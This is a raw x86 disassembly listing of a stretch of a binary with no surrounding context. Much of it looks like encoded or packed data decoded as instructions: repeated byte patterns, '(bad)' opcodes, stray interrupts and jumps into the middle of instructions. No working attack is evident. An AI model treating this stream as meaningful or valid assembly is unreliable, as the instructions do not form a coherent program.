  4233fa:	cmp    eax,0x3b5596cd
  4233ff:	jns    0x42343c
  423401:	or     al,0xd3
  423403:	lods   eax,DWORD PTR ds:[esi]
  423404:	sub    bl,dl
  423406:	jmp    0x42339a
  423408:	push   ebx
  423409:	jge    0x4233d8
  42340b:	jbe    0x4233ba
  42340d:	xor    edx,edx
  42340f:	cmp    ebx,edx
  423411:	clc    
  423412:	add    cl,BYTE PTR [edx]
  423414:	jbe    0x4233ab
  423416:	int    0x76
  423418:	sbb    eax,0x3b1d8dcd
  42341d:	lds    edi,FWORD PTR [ebx]
  42341f:	psrlq  mm6,mm2
  423422:	sub    bl,dl
  423424:	mov    ebp,0xcdd35392
  423429:	lea    edx,[ebp+0x16d87d43]
  42342f:	int    0x76
  423431:	sbb    eax,0x3b1d8dcd
  423436:	lds    edi,FWORD PTR [ebx]
  423438:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  42343f:	push   ebx
  423440:	ror    DWORD PTR [edx],cl
  423442:	jbe    0x4233d9
  423444:	int    0x76
  423446:	cmp    eax,0x3b3d8dcd
  42344b:	lds    edi,FWORD PTR [ebx]
  42344d:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  423454:	push   ebx
  423455:	ror    ebp,cl
  423457:	lea    edx,[ebp+0xad3d12f]
  42345d:	jbe    0x4233f4
  42345f:	int    0x76
  423461:	inc    ebp
  423462:	int    0x8d
  423464:	inc    ebp
  423465:	cmp    eax,ebp
  423467:	cmp    ecx,DWORD PTR [edi]
  423469:	shl    edx,cl
  42346b:	sub    bl,dl
  42346d:	mov    ebp,0xcdd35392
  423472:	lea    edx,[ebp+0x52f7d43]
  423478:	pusha  
  423479:	xchg   edx,eax
  42347a:	add    BYTE PTR [eax+0xa9576cd],0x76
  423481:	or     eax,0x875576cd
  423486:	jbe    0x423458
  423488:	or     ah,dh
  42348a:	xchg   ebp,eax
  42348b:	or     dh,BYTE PTR [esi+0x6d]
  42348e:	pop    ebp
  42348f:	inc    ecx
  423490:	and    DWORD PTR [esi+0x5d760a35],eax
  423496:	leave  
  423497:	jbe    0x4234ae
  423499:	cmp    DWORD PTR [ecx],esp
  42349b:	xchg   BYTE PTR ds:0xb23576c9,dh
  4234a1:	and    DWORD PTR [esi-0xe89f5cb],eax
  4234a7:	int    0x76
  4234a9:	xchg   ebp,eax
  4234aa:	int    0x8d
  4234ac:	xchg   ebp,eax
  4234ad:	cmp    eax,ebp
  4234af:	cmp    ecx,DWORD PTR [edi]
  4234b1:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4234b7:	push   ebx
  4234b8:	ror    DWORD PTR [edx],cl
  4234ba:	jbe    0x423539
  4234bc:	int    0x6d
  4234be:	jmp    0x4234c6
  4234c0:	add    DWORD PTR [eax-0x36923280],0x7006
  4234ca:	add    BYTE PTR [ebx],cl
  4234cc:	and    DWORD PTR [esi-0x369232cb],eax
  4234d2:	push   es
  4234d3:	xchg   esp,eax
  4234d4:	add    BYTE PTR [eax],al
  4234d6:	add    bh,dh
  4234d8:	and    DWORD PTR [esi-0x329232cb],eax
  4234de:	ins    DWORD PTR es:[edi],dx
  4234df:	int    0x76
  4234e1:	icebp  
  4234e2:	int    0x8d
  4234e4:	icebp  
  4234e5:	cmp    eax,ebp
  4234e7:	cmp    ecx,DWORD PTR [edi]
  4234e9:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4234ef:	push   ebx
  4234f0:	ror    ebp,cl
  4234f2:	lea    edi,[ebp+0x2f]
  4234f5:	rcl    ebx,1
  4234f7:	int    0x8d
  4234f9:	ins    DWORD PTR es:[edi],dx
  4234fa:	retf   0x8884
  4234fd:	or     DWORD PTR [esi-0x57],esi
  423500:	int    0x6d
  423502:	int    0x76
  423504:	icebp  
  423505:	int    0x8d
  423507:	icebp  
  423508:	cmp    ecx,DWORD PTR [edi]
  42350a:	cmp    eax,ebp
  42350c:	shl    edx,cl
  42350e:	sub    bl,dl
  423510:	mov    ebp,0xcdd35392
  423515:	lea    edi,[ebp+0x2f]
  423518:	rcl    ebx,1
  42351a:	int    0x8d
  42351c:	adc    eax,0x3b1596cd
  423521:	or     al,0x3b
  423523:	cdq    
  423524:	shr    ebx,cl
  423526:	xchg   edx,eax
  423527:	shr    edx,cl
  423529:	sub    BYTE PTR [ebx+0x13],dl
  42352c:	xchg   ebx,edx
  42352e:	int    0x8d
  423530:	ins    DWORD PTR es:[edi],dx
  423531:	das    
  423532:	pop    ecx
  423533:	dec    esp
  423534:	mov    ch,cl
  423536:	push   es
  423537:	jo     0x423539
  423539:	add    BYTE PTR [eax],al
  42353b:	int    0x17
  42353d:	jo     0x42353f
  42353f:	add    BYTE PTR [eax],al
  423541:	cmp    eax,ebp
  423543:	cmp    ebx,DWORD PTR [ecx-0x2c6d422d]
  423549:	jmp    0x2fd3:0x87d25328
  423550:	pop    ecx
  423551:	lea    ebp,[ecx-0x72f682c5]
  423557:	test   eax,0x76ca6dcd
  42355c:	test   eax,0xcdf18dcd
  423561:	xchg   esi,eax
  423562:	icebp  
  423563:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423566:	cdq    
  423567:	shr    edx,cl
  423569:	sub    bl,dl
  42356b:	jmp    0x4234ff
  42356d:	push   ebx
  42356e:	adc    ecx,ebp
  423570:	xchg   esi,eax
  423571:	jge    0x4235a2
  423573:	rcl    DWORD PTR [ebx],1
  423575:	int    0x96
  423577:	ins    DWORD PTR es:[edi],dx
  423578:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42357f:	icebp  
  423580:	int    0x8d
  423582:	icebp  
  423583:	cmp    eax,ebp
  423585:	cmp    ecx,DWORD PTR [edi]
  423587:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42358d:	push   ebx
  42358e:	ror    ebp,cl
  423590:	lea    edi,[ebp+0x2f]
  423593:	rcl    ebx,1
  423595:	int    0x8d
  423597:	ins    DWORD PTR es:[edi],dx
  423598:	retf   0x8884
  42359b:	or     DWORD PTR [esi-0x57],esi
  42359e:	int    0x6d
  4235a0:	int    0x76
  4235a2:	icebp  
  4235a3:	int    0x8d
  4235a5:	icebp  
  4235a6:	cmp    eax,ebp
  4235a8:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  4235ae:	repnz sub BYTE PTR [ebx-0x2d],dl
  4235b2:	int    0x8d
  4235b4:	jge    0x4235e5
  4235b6:	rcl    ebx,1
  4235b8:	int    0x8d
  4235ba:	pop    ebp
  4235bb:	int    0x96
  4235bd:	pop    ebp
  4235be:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235c1:	cdq    
  4235c2:	shr    ebx,cl
  4235c4:	xchg   edx,eax
  4235c5:	shr    edx,cl
  4235c7:	sub    BYTE PTR [ebx+0x13],dl
  4235ca:	xchg   ebx,edx
  4235cc:	int    0x8d
  4235ce:	ins    DWORD PTR es:[edi],dx
  4235cf:	das    
  4235d0:	pop    ecx
  4235d1:	dec    esp
  4235d2:	mov    ch,cl
  4235d4:	push   es
  4235d5:	xchg   esp,eax
  4235d6:	add    BYTE PTR [eax],al
  4235d8:	add    ch,cl
  4235da:	pop    ss
  4235db:	xchg   esp,eax
  4235dc:	add    BYTE PTR [eax],al
  4235de:	add    BYTE PTR [ebx],bh
  4235e0:	lds    edi,FWORD PTR [ebx]
  4235e2:	cdq    
  4235e3:	sar    DWORD PTR [ebp+0x28ead392],cl
  4235e9:	push   ebx
  4235ea:	rol    BYTE PTR [edi-0x72a6d02d],cl
  4235f0:	test   eax,0x8d097d3b
  4235f5:	test   eax,0x76ca6dcd
  4235fa:	test   eax,0xcdf18dcd
  4235ff:	xchg   esi,eax
  423600:	icebp  
  423601:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423604:	cdq    
  423605:	shr    edx,cl
  423607:	sub    bl,dl
  423609:	jmp    0x42359d
  42360b:	push   ebx
  42360c:	adc    ecx,ebp
  42360e:	xchg   esi,eax
  42360f:	jge    0x423640
  423611:	rcl    DWORD PTR [ebx],1
  423613:	int    0x96
  423615:	ins    DWORD PTR es:[edi],dx
  423616:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42361d:	xor    eax,0x3b358dcd
  423622:	(bad)  
  423624:	(bad)
  423627:	sub    bl,dl
  423629:	mov    ebp,0xcdd35392
  42362e:	lea    ebx,[ebp-0x33]
  423631:	xchg   esi,eax
  423632:	pop    ebp
  423633:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423636:	cdq    
  423637:	shr    ebx,cl
  423639:	xchg   edx,eax
  42363a:	shr    edx,cl
  42363c:	sub    BYTE PTR [ebx+0x13],dl
  42363f:	das    
  423640:	rcl    ebx,1
  423642:	xchg   DWORD PTR [esi+0x7d],esi
  423645:	or     dh,BYTE PTR [esi+0x7d]
  423648:	int    0x76
  42364a:	jge    0x423619
  42364c:	lea    ecx,ds:0xb2f7d43
  423652:	(bad)  
  423653:	inc    DWORD PTR [eax]
  423655:	add    ch,cl
  423657:	jbe    0x4236b6
  423659:	int    0x8d
  42365b:	pop    ebp
  42365c:	cmp    ecx,DWORD PTR [edi]
  42365e:	shl    edx,cl
  423660:	sub    BYTE PTR [ebx],bh
  423662:	(bad)
  423665:	xchg   edx,eax
  423666:	push   ebx
  423667:	ror    ebp,cl
  423669:	lea    ecx,ds:0xcdd3d12f
  42366f:	lea    edx,[ebp-0x142cf3c5]
  423675:	xchg   edx,eax
  423676:	push   ebx
  423677:	ror    ebp,cl
  423679:	lea    edx,[ebp-0xd2cf0c5]
  42367f:	sub    BYTE PTR [ebx-0x2d],dl
  423682:	or     dh,BYTE PTR [esi+0x35]
  423685:	int    0x76
  423687:	popf   
  423688:	int    0x8d
  42368a:	popf   
  42368b:	cmp    ecx,DWORD PTR [edi]
  42368d:	shl    edx,cl
  42368f:	sub    BYTE PTR [ebx],bh
  423691:	(bad)
  423694:	xchg   edx,eax
  423695:	push   ebx
  423696:	ror    ebp,cl
  423698:	lea    ebx,[ebp+0x3b9d96cd]
  42369e:	or     al,0xd3
  4236a0:	jmp    0x423634
  4236a2:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  4236a8:	adc    eax,DWORD PTR [edi+0x7d87358d]
  4236ae:	xchg   DWORD PTR [ebp+0x558d0a55],ecx
  4236b4:	in     al,dx
  4236b5:	sbb    al,0xcd
  4236b7:	jbe    0x423656
  4236b9:	int    0x8d
  4236bb:	popf   
  4236bc:	cmp    eax,ebp
  4236be:	cmp    ecx,DWORD PTR [edi]
  4236c0:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4236c6:	push   ebx
  4236c7:	rol    DWORD PTR [edi+0x760a5576],cl
  4236cd:	push   ebp
  4236ce:	int    0x76
  4236d0:	popf   
  4236d1:	int    0x8d
  4236d3:	popf   
  4236d4:	cmp    eax,ebp
  4236d6:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  4236dc:	repnz sub BYTE PTR [ebx-0x2d],dl
  4236e0:	int    0x8d
  4236e2:	lods   eax,DWORD PTR ds:[esi]
  4236e3:	xor    edi,DWORD PTR [ebp-0x33]
  4236e6:	jbe    0x423685
  4236e8:	int    0x96
  4236ea:	popf   
  4236eb:	cmp    eax,ebp
  4236ed:	cmp    ebx,DWORD PTR [ecx-0x2cd7152d]
  4236f3:	mov    ebp,0xcdd25392
  4236f8:	xchg   esi,eax
  4236f9:	push   ebp
  4236fa:	das    
  4236fb:	rcl    edx,1
  4236fd:	inc    ebx
  4236fe:	shr    DWORD PTR [edi],cl
  423700:	pop    es
  423701:	adc    ebp,edi
  423703:	add    BYTE PTR [eax],al
  423705:	int    0x76
  423707:	stc    
  423708:	int    0x76
  42370a:	stc    
  42370b:	int    0x76
  42370d:	std    
  42370e:	or     dh,BYTE PTR [esi+0x35]
  423711:	int    0x76
  423713:	mov    ch,cl
  423715:	lea    esp,ds:0x3b2596cd
  42371b:	or     al,0xd3
  42371d:	jmp    0x4236b1
  42371f:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  423725:	add    BYTE PTR [eax+0x5328ead3],0x13
  42372c:	jno    0x4236fb
  42372e:	lea    esp,[ebp-0x33]
  423731:	xchg   esi,eax
  423732:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  423736:	cdq    
  423737:	shr    ebx,cl
  423739:	xchg   edx,eax
  42373a:	shr    edx,cl
  42373c:	sub    BYTE PTR [ebx+0x13],dl
  42373f:	jno    0x42370e
  423741:	(bad)  
  423742:	stc    
  423743:	int    0x96
  423745:	stc    
  423746:	add    dh,dl
  423748:	xor    eax,0x993b0c3b
  42374d:	shr    ebx,cl
  42374f:	xchg   edx,eax
  423750:	shr    edx,cl
  423752:	sub    BYTE PTR [ebx+0x13],dl
  423755:	jno    0x423757
  423757:	jo     0x42376d
  423759:	int    0x8d
  42375b:	stc    
  42375c:	int    0x96
  42375e:	stc    
  42375f:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423762:	cdq    
  423763:	shr    ebx,cl
  423765:	xchg   edx,eax
  423766:	shr    edx,cl
  423768:	sub    BYTE PTR [ebx+0x13],dl
  42376b:	or     dh,BYTE PTR [esi+0x65]
  42376e:	inc    ebx
  42376f:	jge    0x4237a0
  423771:	add    eax,0x808080ab
  423776:	int    0x76
  423778:	stc    
  423779:	in     al,dx
  42377a:	(bad)  
  42377b:	int    0x96
  42377d:	or     dh,BYTE PTR gs:[esi-0x53]
  423781:	push   ecx
  423782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423783:	lods   eax,DWORD PTR ds:[esi]
  423784:	int    0x8d
  423786:	lods   eax,DWORD PTR ds:[esi]
  423787:	shr    ebx,cl
  423789:	xchg   edx,eax
  42378a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42378d:	lods   eax,DWORD PTR ds:[esi]
  42378e:	sub    BYTE PTR [ebx-0x2d],dl
  423791:	int    0x8d
  423793:	jne    0x42375f
  423795:	dec    esp
  423796:	or     DWORD PTR [ecx],0x8dcd304c
  42379c:	mov    ch,0xcd
  42379e:	lea    esi,[ebp+0x3bb596cd]
  4237a4:	or     al,0x3b
  4237a6:	cdq    
  4237a7:	shr    edx,cl
  4237a9:	sub    bl,dl
  4237ab:	jmp    0x42373f
  4237ad:	push   ebx
  4237ae:	adc    ecx,ebp
  4237b0:	xchg   esi,eax
  4237b1:	mov    ch,0x87
  4237b3:	jge    0x423782
  4237b5:	jbe    0x423764
  4237b7:	cmp    edx,ebp
  4237b9:	add    al,0xad
  4237bb:	std    
  4237bc:	add    al,0xea
  4237be:	std    
  4237bf:	shr    ebx,cl
  4237c1:	sub    BYTE PTR [edi+0x3bd353d2],al
  4237c7:	leave  
  4237c8:	int    0x8d
  4237ca:	std    
  4237cb:	int    0x96
  4237cd:	std    
  4237ce:	shr    edx,cl
  4237d0:	xchg   edx,eax
  4237d1:	shr    ebx,cl
  4237d3:	sub    BYTE PTR [ebx-0x1d],dl
  4237d6:	cmp    ebx,ecx
  4237d8:	inc    ebx
  4237d9:	rcl    dh,cl
  4237db:	mov    ds:0xcd8876cd,eax
  4237e0:	lea    ebp,ds:0xcd2d96cd
  4237e6:	add    DWORD PTR [ecx],edx
  4237e8:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  4237f2:	shr    edx,cl
  4237f4:	sub    BYTE PTR [ebx+0x13],dl
  4237f7:	jno    0x4237c6
  4237f9:	(bad)  
  4237fa:	stc    
  4237fb:	int    0x96
  4237fd:	stc    
  4237fe:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423801:	cdq    
  423802:	shr    ebx,cl
  423804:	xchg   edx,eax
  423805:	shr    edx,cl
  423807:	sub    BYTE PTR [ebx+0x13],dl
  42380a:	jno    0x42380c
  42380c:	(bad)  
  42380d:	jne    0x42380f
  42380f:	jo     0x42382d
  423811:	int    0x76
  423813:	or     dh,BYTE PTR gs:[esi+0x75]
  423817:	int    0x76
  423819:	xor    eax,0xcdfd760a
  42381e:	jbe    0x42381d
  423820:	cmp    ecx,ebx
  423822:	add    al,0xbd
  423824:	test   ah,dl
  423826:	xor    ecx,ebp
  423828:	jbe    0x42389f
  42382a:	int    0x14
  42382c:	mov    ch,cl
  42382e:	jbe    0x4238a5
  423830:	int    0x84
  423832:	mov    BYTE PTR [ebx],bh
  423834:	jns    0x423871
  423836:	aad    0xd3
  423838:	lods   eax,DWORD PTR ds:[esi]
  423839:	sub    bl,dl
  42383b:	repz xchg edx,eax
  42383d:	push   ebx
  42383e:	ror    ch,cl
  423840:	xchg   esi,eax
  423841:	jne    0x42384d
  423843:	test   BYTE PTR [edx-0x33],cl
  423846:	jbe    0x423845
  423848:	add    al,0xd3
  42384a:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423851:	xlat   BYTE PTR ds:[ebx]
  423852:	int    0x76
  423854:	std    
  423855:	cmp    ecx,ebx
  423857:	add    al,0xbd
  423859:	test   ah,dl
  42385b:	xor    ecx,ebp
  42385d:	jbe    0x4238d4
  42385f:	int    0x14
  423861:	mov    ch,cl
  423863:	jbe    0x4238da
  423865:	int    0x84
  423867:	mov    BYTE PTR [ebx],bh
  423869:	jns    0x4238a6
  42386b:	aad    0xd3
  42386d:	lods   eax,DWORD PTR ds:[esi]
  42386e:	sub    bl,dl
  423870:	repz xchg edx,eax
  423872:	push   ebx
  423873:	ror    ch,cl
  423875:	xchg   esi,eax
  423876:	jne    0x423882
  423878:	test   BYTE PTR [edx-0x33],cl
  42387b:	jbe    0x42387a
  42387d:	add    al,0xd3
  42387f:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423886:	xlat   BYTE PTR ds:[ebx]
  423887:	int    0x76
  423889:	jne    0x423895
  42388b:	jbe    0x42389a
  42388d:	int    0x76
  42388f:	mov    ch,0xcd
  423891:	lea    esi,[ebp+0xf3bc53b]
  423897:	shl    edx,cl
  423899:	sub    bl,dl
  42389b:	mov    ebp,0xcdd35392
  4238a0:	(bad)  
  4238a1:	stc    
  4238a2:	or     dh,BYTE PTR [esi+0x25]
  4238a5:	leave  
  4238a6:	jbe    0x423874
  4238a8:	imul   edi,DWORD PTR [ecx+0x69],0xb076c9d7
  4238af:	imul   edx,ebp,0x8d0a0c69
  4238b5:	gs adc bh,dl
  4238b8:	into   
  4238b9:	and    DWORD PTR [esi-0x32fad0cb],eax
  4238bf:	add    BYTE PTR [eax+0xd96cd80],0xcd
  4238c6:	sar    DWORD PTR [ebx],cl
  4238c8:	lds    ecx,FWORD PTR [edx]
  4238ca:	jbe    0x423879
  4238cc:	rol    esi,cl
  4238ce:	lods   eax,DWORD PTR ds:[esi]
  4238cf:	xchg   edx,eax
  4238d0:	or     dh,BYTE PTR [esi-0x30]
  4238d3:	int    0xd3
  4238d5:	cmp    edi,DWORD PTR [ecx-0x2d]
  4238d8:	lods   eax,DWORD PTR ds:[esi]
  4238d9:	sub    BYTE PTR [ebx+0x76],dl
  4238dc:	lods   eax,DWORD PTR ds:[esi]
  4238dd:	retf   0x858c
  4238e0:	int3   
  4238e1:	das    
  4238e2:	imul   eax,DWORD PTR [eax+esi*1+0x1830201],0x592fbeeb
  4238ed:	retf   
  4238ee:	inc    ebx
  4238ef:	rcl    esi,cl
  4238f1:	jle    0x4238c0
  4238f3:	jbe    0x4238aa
  4238f5:	int    0x8d
  4238f7:	mov    ch,0xcd
  4238f9:	jbe    0x4238b0
  4238fb:	int    0x96
  4238fd:	mov    ch,0x3b
  4238ff:	jns    0x42393c
  423901:	or     al,0xd3
  423903:	lods   eax,DWORD PTR ds:[esi]
  423904:	sub    bl,dl
  423906:	jmp    0x42389a
  423908:	push   ebx
  423909:	jge    0x4238d8
  42390b:	jbe    0x423972
  42390d:	cmp    edi,DWORD PTR [ecx-0x2d]
  423910:	lods   eax,DWORD PTR ds:[esi]
  423911:	sub    BYTE PTR [ebx+0x76],dl
  423914:	lods   eax,DWORD PTR ds:[esi]
  423915:	cmp    edx,ebp
  423917:	xchg   DWORD PTR [ebp-0x33],edi
  42391a:	jbe    0x4238ec
  42391c:	add    al,0xea
  42391e:	std    
  42391f:	add    al,0xad
  423921:	std    
  423922:	shr    ebx,cl
  423924:	sub    BYTE PTR [edi+0x3b1353f1],al
  42392a:	lock or cl,BYTE PTR [ebp-0x3105ed9b]
  423931:	and    DWORD PTR [esi-0x323329cb],eax
  423937:	jbe    0x42395e
  423939:	in     al,dx
  42393a:	and    cl,ch
  42393c:	jbe    0x423937
  42393e:	int    0x8d
  423940:	stc    
  423941:	cmp    eax,ebp
  423943:	cmp    ecx,DWORD PTR [edi]
  423945:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42394b:	push   ebx
  42394c:	ror    ebp,cl
  42394e:	(bad)  
  42394f:	stc    
  423950:	int    0x96
  423952:	stc    
  423953:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423956:	cdq    
  423957:	shr    ebx,cl
  423959:	xchg   edx,eax
  42395a:	shr    edx,cl
  42395c:	sub    BYTE PTR [ebx+0x13],dl
  42395f:	inc    ebx
  423960:	jge    0x423991
  423962:	add    eax,0x80809223
  423967:	int    0x76
  423969:	or     eax,0xa886ccd
  42396e:	out    0xb5,al
  423970:	leave  
  423971:	jbe    0x423998
  423973:	mov    dl,0x21
  423975:	xchg   BYTE PTR ds:0x393576c9,dh
  42397b:	and    DWORD PTR [esi-0x6a8936cb],eax
  423981:	dec    ecx
  423982:	mov    al,ds:0x76c93586
  423987:	lods   eax,DWORD PTR ds:[esi]
  423988:	imul   esp,DWORD PTR [ecx],0x76c93586
  42398e:	and    ch,BYTE PTR gs:[ebx-0x7a]
  423992:	xor    eax,0xcd3d760a
  423997:	jbe    0x423921
  423999:	int    0x8d
  42399b:	lods   eax,DWORD PTR ds:[esi]
  42399c:	int    0x96
  42399e:	lods   eax,DWORD PTR ds:[esi]
  42399f:	cmp    ecx,DWORD PTR [ebx+edx*8]
  4239a2:	jmp    0x423936
  4239a4:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  4239aa:	adc    esi,DWORD PTR [ecx-0x33]
  4239ad:	lea    edx,[ebp+0x3b9596cd]
  4239b3:	or     al,0xd3
  4239b5:	jmp    0x423949
  4239b7:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4239bd:	add    BYTE PTR [eax+0x5328ead3],0x13
  4239c4:	jno    0x423993
  4239c6:	lea    esp,[ebp-0x33]
  4239c9:	xchg   esi,eax
  4239ca:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  4239ce:	cdq    
  4239cf:	shr    ebx,cl
  4239d1:	xchg   edx,eax
  4239d2:	shr    edx,cl
  4239d4:	sub    BYTE PTR [ebx+0x13],dl
  4239d7:	jno    0x4239a6
  4239d9:	lea    esi,[ebp+0x3bb596cd]
  4239df:	or     al,0x3b
  4239e1:	cdq    
  4239e2:	shr    ebx,cl
  4239e4:	xchg   edx,eax
  4239e5:	shr    edx,cl
  4239e7:	sub    BYTE PTR [ebx+0x13],dl
  4239ea:	jno    0x4239ec
  4239ec:	jo     0x423a02
  4239ee:	or     dh,BYTE PTR [esi+0x65]
  4239f1:	int    0x76
  4239f3:	mov    ch,cl
  4239f5:	lea    ebp,[ebp+0x3bad96cd]
  4239fb:	or     al,0xd3
  4239fd:	jmp    0x423991
  4239ff:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  423a05:	add    BYTE PTR [eax+0x5328ead3],0x13
  423a0c:	jno    0x4239db
  423a0e:	lea    edx,[ebp+0x3b9596cd]
  423a14:	or     al,0x3b
  423a16:	cdq    
  423a17:	shr    ebx,cl
  423a19:	xchg   edx,eax
  423a1a:	shr    edx,cl
  423a1c:	sub    BYTE PTR [ebx+0x13],dl
  423a1f:	jno    0x4239ee
  423a21:	lea    esi,[ebp+0xb596cd]
  423a27:	(bad)  
  423a28:	cmp    eax,0x993b0c3b
  423a2d:	shr    ebx,cl
  423a2f:	xchg   edx,eax
  423a30:	shr    edx,cl
  423a32:	sub    BYTE PTR [ebx+0x13],dl
  423a35:	jno    0x423a37
  423a37:	jo     0x423a4d
  423a39:	int    0x8d
  423a3b:	mov    ch,0xa
  423a3d:	jbe    0x4239ec
  423a3f:	int    0x76
  423a41:	mov    ch,0x3b
  423a43:	or     al,0x3b
  423a45:	jns    0x423a1a
  423a47:	jmp    0x4239db
  423a49:	shr    DWORD PTR [ebp-0x3282acd8],cl
  423a4f:	jbe    0x423ab6
  423a51:	inc    ebx
  423a52:	jge    0x423a83
  423a54:	add    eax,0x8080853c
  423a59:	int    0x8d
  423a5b:	mov    ch,0xcd
  423a5d:	xchg   esi,eax
  423a5e:	mov    ch,0x3b
  423a60:	or     al,0x3b
  423a62:	cdq    
  423a63:	shr    ebx,cl
  423a65:	xchg   edx,eax
  423a66:	shr    edx,cl
  423a68:	sub    BYTE PTR [ebx+0x13],dl
  423a6b:	inc    ebx
  423a6c:	lea    ebp,[ebp-0x7ab2fad1]
  423a72:	add    BYTE PTR [eax-0x32da7233],0x8d
  423a79:	and    eax,0x192ebd3
  423a7e:	add    ch,BYTE PTR [edi-0x723277f7]
  423a84:	mov    ch,0xcd
  423a86:	lea    esi,[ebp+0x192ebd3]
  423a8c:	add    ch,BYTE PTR [edi-0x327e83f7]
  423a92:	lea    esi,ds:0xd3358dcd
  423a98:	jmp    0x423a2c
  423a9a:	add    DWORD PTR [edx],eax
  423a9c:	scas   eax,DWORD PTR es:[edi]
  423a9d:	or     DWORD PTR [edx+edx*4+0x4],edi
  423aa1:	aaa    
  423aa2:	sbb    al,0x0
  423aa4:	add    BYTE PTR [eax],al
  423aa6:	add    BYTE PTR [edi+esi*1],0x24
  423aaa:	add    BYTE PTR [eax],al
  423aac:	add    BYTE PTR [eax+0x24cfcf],al
  423ab2:	add    BYTE PTR [eax],al
  423ab4:	jno    0x423ab6
  423ab6:	(bad)  
  423ab7:	cmp    eax,0x1ccfcf
  423abc:	add    BYTE PTR [eax],al
  423abe:	add    dh,dl
  423ac0:	lods   eax,DWORD PTR ds:[esi]
  423ac1:	jno    0x423a90
  423ac3:	lea    ecx,ds:0xcd4c9100
  423ac9:	lea    esi,[ebp+0x4]
  423acc:	shl    DWORD PTR [eax],cl
  423ace:	jno    0x423b40
  423ad0:	mov    ebp,0xefef
  423ad5:	or     dh,BYTE PTR [esi-0x30]
  423ad8:	int    0x76
  423ada:	mov    ch,cl
  423adc:	lea    ebp,ds:0xcd2d96cd
  423ae2:	add    DWORD PTR [ecx],edx
  423ae4:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423aee:	shr    edx,cl
  423af0:	sub    BYTE PTR [ebx+0x13],dl
  423af3:	jno    0x423ac2
  423af5:	lea    esi,[ebp+0x3bb596cd]
  423afb:	or     al,0x3b
  423afd:	cdq    
  423afe:	shr    ebx,cl
  423b00:	xchg   edx,eax
  423b01:	shr    edx,cl
  423b03:	sub    BYTE PTR [ebx+0x13],dl
  423b06:	jno    0x423b08
  423b08:	(bad)  
  423b09:	add    BYTE PTR gs:[eax+0x1c],dh
  423b0d:	int    0x76
  423b0f:	rcl    bl,1
  423b11:	ins    DWORD PTR es:[edi],dx
  423b12:	xchg   edx,eax
  423b13:	cmp    ecx,ecx
  423b15:	inc    ebx
  423b16:	leave  
  423b17:	int    0x76
  423b19:	mov    ch,cl
  423b1b:	lea    ebp,ds:0x811101cd
  423b21:	add    BYTE PTR [eax-0x29d26933],0x54
  423b28:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423b2b:	cdq    
  423b2c:	shr    ebx,cl
  423b2e:	xchg   edx,eax
  423b2f:	shr    edx,cl
  423b31:	sub    BYTE PTR [ebx+0x13],dl
  423b34:	jno    0x423b03
  423b36:	lea    esi,[ebp+0x3bb596cd]
  423b3c:	or     al,0x3b
  423b3e:	cdq    
  423b3f:	shr    ebx,cl
  423b41:	xchg   edx,eax
  423b42:	shr    edx,cl
  423b44:	sub    BYTE PTR [ebx+0x13],dl
  423b47:	jno    0x423b49
  423b49:	(bad)  
  423b4a:	jne    0x423b4c
  423b4c:	jo     0x423b6a
  423b4e:	int    0x76
  423b50:	lods   eax,DWORD PTR ds:[esi]
  423b51:	or     dh,BYTE PTR [esi+0x75]
  423b54:	int    0x76
  423b56:	cmp    eax,0xecfd760a
  423b5b:	cmp    BYTE PTR [ebx],bh
  423b5d:	or     al,0x3b
  423b5f:	cdq    
  423b60:	shr    ebx,cl
  423b62:	xchg   edx,eax
  423b63:	shr    edx,cl
  423b65:	sub    BYTE PTR [ebx+0x13],dl
  423b68:	jno    0x423b37
  423b6a:	lea    esi,[ebp+0x3bb596cd]
  423b70:	or     al,0x3b
  423b72:	cdq    
  423b73:	shr    ebx,cl
  423b75:	xchg   edx,eax
  423b76:	shr    edx,cl
  423b78:	sub    BYTE PTR [ebx+0x13],dl
  423b7b:	jno    0x423b7d
  423b7d:	(bad)  
  423b7e:	lods   eax,DWORD PTR ds:[esi]
  423b7f:	add    BYTE PTR [eax+0x1c],dh
  423b82:	int    0x76
  423b84:	std    
  423b85:	or     dh,BYTE PTR [esi+0x1d]
  423b88:	int    0x76
  423b8a:	jne    0x423b96
  423b8c:	out    0x55,al
  423b8e:	or     dh,BYTE PTR [esi-0x30]
  423b91:	leave  
  423b92:	jbe    0x423b31
  423b94:	inc    ecx
  423b95:	and    DWORD PTR [esi+0x5576cd35],eax
  423b9b:	int    0x8d
  423b9d:	push   ebp
  423b9e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423ba1:	or     al,0xd3
  423ba3:	lods   eax,DWORD PTR ds:[esi]
  423ba4:	sub    bl,dl
  423ba6:	jmp    0x423b3a
  423ba8:	push   ebx
  423ba9:	ror    DWORD PTR [edx],cl
  423bab:	jbe    0x423bf2
  423bad:	int    0x76
  423baf:	push   ebp
  423bb0:	int    0x8d
  423bb2:	push   ebp
